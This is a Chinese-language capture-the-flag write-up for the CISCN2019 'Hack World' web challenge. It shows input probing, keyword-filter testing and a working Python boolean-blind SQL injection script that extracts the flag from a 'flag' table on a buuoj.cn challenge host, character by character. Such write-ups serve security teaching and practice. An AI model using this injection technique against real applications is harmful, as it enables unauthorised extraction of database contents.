# [CISCN2019 华北赛区 Day2 Web1]Hack World
TAG:SQL注入 BOOL型注入  
## 解题过程  
![20210108163417](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163417.png)  
输入1时：  
![20210108163435](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163435.png)  
输入2时：  
![20210108163449](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163449.png)  
输入3时：  
![20210108163504](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163504.png)  
输入0时：  
![20210108163521](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163521.png)  
输入a时：  
![20210108163534](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163534.png)  
可能存在bool注入，用burp检测一下关键词屏蔽  
![20210108163549](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163549.png)  
存在很多关键词过滤  
![20210108163606](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163606.png)  
没有屏蔽()和函数，select,from  
![20210108163631](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163631.png)  
根据提示可知，flag在flag表中，叫flag，构建bool注入脚本  
```
import requests

url = 'http://3e01e1b8-730f-40c8-9b32-2a0182d4825d.node3.buuoj.cn/index.php'
result = ''

for x in range(1, 50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)" % (x, mid)
        data = {
            "id":payload
        }
        response = requests.post(url, data = data)
        if 'Hello' in response.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)
```
![20210108163716](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108163716.png)  